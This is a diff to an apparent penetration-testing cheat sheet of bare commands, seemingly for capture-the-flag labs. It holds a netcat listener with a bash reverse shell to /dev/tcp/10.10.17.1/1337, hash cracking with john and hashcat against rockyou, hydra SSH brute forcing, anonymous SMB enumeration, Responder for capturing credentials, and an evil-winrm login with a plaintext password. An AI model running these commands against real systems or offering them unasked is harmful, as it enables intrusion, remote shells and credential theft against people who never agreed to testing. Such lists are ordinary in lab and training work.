@@ -1,14 +1,19 @@
+nmap -sC -sV -v [TARGET-IP]
+
 nmap -v -A scanme.nmap.org
 
 nmap -sS -p 1-65535 -v scanme.nmap.org 
 
 nmap -O -v scanme.nmap.org
 
-ssh -L 8000:12.34.56.789:3306 exampleuser@exampleserver
+ssh -L 8000:localhost:3306 exampleuser@exampleserver
 
 ncat -l -p 1337
 /bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
 
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+
+/usr/share/wordlists/rockyou.txt
 hashcat -m 0 -a 0 md5.txt rockyou.txt
 
 hashcat -m 100 -a 0 sha1.txt rockyou.txt
@@ -22,4 +27,38 @@ hydra -L user.txt -p msfadmin 192.168.29.135 ssh -t 4
 hydra -s 22 -L user.txt -P pass.txt 192.168.29.229 ssh -t 5
 
 hydra -L user.txt -P pass.txt -M ip.txt ssh -t 4
+
+gobuster dir -u http://192.168.40.160/ -w common.txt
+
+gobuster dns -d google.com https://www.google.com -w common.txt
+
+python3 -m http.server 8000
+wget http://example.com/sample.php
+
+curl -o myfile.html http://example.com
+
+curl -O http://example.com/file.txt
+
+curl -v http://example.com/
+
+smbclient -L [TARGET-IP] -N
+
+smbclient //[TARGET-IP]/[SHARE] -N
+
+smbclient -L [TARGET-IP] -U [USERNAME]
+
+xfreerdp /v:[TARGET-IP] /cert:ignore /u:Administrator
+
+git clone https://github.com/lgandx/Responder
+sudo python3 Responder.py -I tun0
+
+evil-winrm -i 10.129.136.91 -u administrator -p badminton
+
+
+
+
+
+
+
+
 
